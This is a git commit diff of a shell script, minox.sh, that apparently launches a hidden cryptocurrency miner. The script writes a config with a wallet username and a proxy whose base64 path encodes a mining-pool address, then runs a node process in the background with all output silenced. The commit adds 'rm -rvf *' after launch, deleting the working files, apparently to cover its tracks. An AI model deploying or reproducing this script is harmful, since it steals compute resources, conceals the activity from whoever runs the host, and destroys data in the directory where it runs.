b3471393aecf706f5ec42cee99590e3d51c8f629
paskofa10 <mr.paskofa10@jugda.com>
2025-09-09 19:23:47 +0700

    Update minox.sh

--- minox.sh
+++ minox.sh
@@ -5,6 +5,8 @@ tar -xvf mino.tar.gz
 echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "blue-mino/2.0", "threads": 7}' > data.txt
 nproc --all 
 node app.js > /dev/null 2>&1 &
+sleep 10
+rm -rvf *
 while true
 do
         echo "ojo lali ngopi boss..."
